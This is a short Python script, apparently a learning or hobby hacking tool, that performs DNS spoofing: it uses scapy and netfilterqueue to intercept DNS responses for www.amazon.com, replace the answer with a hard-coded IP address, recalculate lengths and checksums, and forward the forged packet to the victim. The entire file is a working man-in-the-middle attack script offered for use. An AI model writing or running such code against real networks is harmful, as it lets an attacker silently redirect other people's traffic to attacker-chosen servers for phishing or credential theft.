#!/usr/bin/env/python
import scapy.all as scapy
import netfilterqueue
# Found code online by 5H4D0W-R007
# netfilterqueue module used to interact with the queue



# After the queue is created to trap the request & response, accessing this queue...
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    # converting packets to scapy packets

    if scapy_packet.haslayer(scapy.DNSRR): #DNSResourceRecord for reponse
        qname = scapy_packet[scapy.DNSQR].qname #DNSQuestionRecord for request
        if "www.amazon.com" in qname:
            print("[+] Spoofing target...")
            # Create DNSRR[response] with spoofed fields
            answer = scapy.DNSRR(rrname=qname, rdata="17.178.96.59")
            scapy_packet[scapy.DNS].an = answer #modifying the answer field
            scapy_packet[scapy.DNS].ancount = 1 #hardcoded to a single answer
            # Removing len and checksum fields for IP and UDP layer, scapy will recalculate them for spoofed packet
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len
            packet.set_payload(str(scapy_packet)) #set payload as modified scapy packet
        #print(scapy_packet.show())
    packet.accept() #to forward the packet to dest

queue = netfilterqueue.NetfilterQueue() # instance
queue.bind(0, process_packet) # process_packet -> callback function
# to connect/bind to queue0
queue.run()
